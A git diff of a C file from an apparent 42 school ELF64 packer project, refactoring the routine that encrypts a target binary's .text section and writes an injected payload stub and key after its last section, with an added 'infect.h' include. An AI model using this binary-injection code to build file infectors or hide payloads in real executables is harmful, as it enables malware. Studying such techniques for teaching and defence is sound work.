@@ -1,12 +1,12 @@
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
-/*   elf64_setup_payload.c                              :+:      :+:    :+:   */
+/*   setup_payload.c                                    :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/05/11 00:10:33 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/05/15 19:29:57 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/06 04:52:24 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -15,6 +15,8 @@
 #include <time.h>
 #include <stdbool.h>
 #include <linux/elf.h>
+#include "utils.h"
+#include "infect.h"
 
 /*
 **  Elf64_packer memory overview
@@ -52,8 +54,8 @@
 */
 
 # define CALL_INSTR_SIZE	5 /* sizeof "call mark_below" -> e8 2000 0000 */
-# define SECRET_SIGNATURE	"42Remblai"
-# define SECRET_LEN		sizeof(SECRET_SIGNATURE)
+# define SECRET_SIGNATURE	(char[10]){'4','2','R','e','m','b','l','a','i','\0'}
+# define SECRET_LEN		10
 
 struct payload_constants
 {
@@ -67,17 +69,15 @@ struct payload_constants
 
 static void	generate_key(char *buffer, size_t len)
 {
-	srand(time(NULL));
-
 	for (size_t i = 0; i < len; i++)
-		buffer[i] = rand();
+		buffer[i] = ft_rand();
 }
 
 static void	init_constants(struct payload_constants *constants, \
 			const struct entry *original_entry, \
 			const struct endians_pointer endians)
 {
-	memcpy(constants->key, SECRET_SIGNATURE, SECRET_LEN);
+	ft_memcpy(constants->key, SECRET_SIGNATURE, SECRET_LEN);
 	generate_key((char *)constants->key + SECRET_LEN, 16 - SECRET_LEN);
 
 	const size_t		end_of_last_section = original_entry->end_of_last_section;
@@ -93,7 +93,9 @@ static void	init_constants(struct payload_constants *constants, \
 	constants->text_size                = sh_size;
 }
 
-bool		setup_payload(const struct entry *original_entry, const struct endians_pointer endians)
+bool		setup_payload(const struct entry *original_entry, \
+			const struct endians_pointer endians, \
+			const struct safe_pointer info)
 {
 	struct payload_constants	constants;
 
@@ -104,16 +106,16 @@ bool		setup_payload(const struct entry *original_entry, const struct endians_poi
 	const size_t	payload_off  = original_entry->end_of_last_section;
 	const size_t	text_off     = payload_off - constants.relative_text_address;
 
-	void	*payload_location    = clone_safe(payload_off, payload_size);
-	void	*constants_location  = clone_safe(payload_off + CALL_INSTR_SIZE, sizeof(constants));
-	void	*text_location       = clone_safe(text_off, text_size);
+	void	*payload_location    = safe(payload_off, payload_size);
+	void	*constants_location  = safe(payload_off + CALL_INSTR_SIZE, sizeof(constants));
+	void	*text_location       = safe(text_off, text_size);
 
 	if (!payload_location || !constants_location || !text_location)
 		return (false);
 
 	encrypt(32, text_location, constants.key, text_size);
-	memcpy(payload_location, begin_payload, payload_size);
-	memcpy(constants_location, &constants, sizeof(constants));
+	ft_memcpy(payload_location, begin_payload, payload_size);
+	ft_memcpy(constants_location, &constants, sizeof(constants));
 
 	return true;
 }
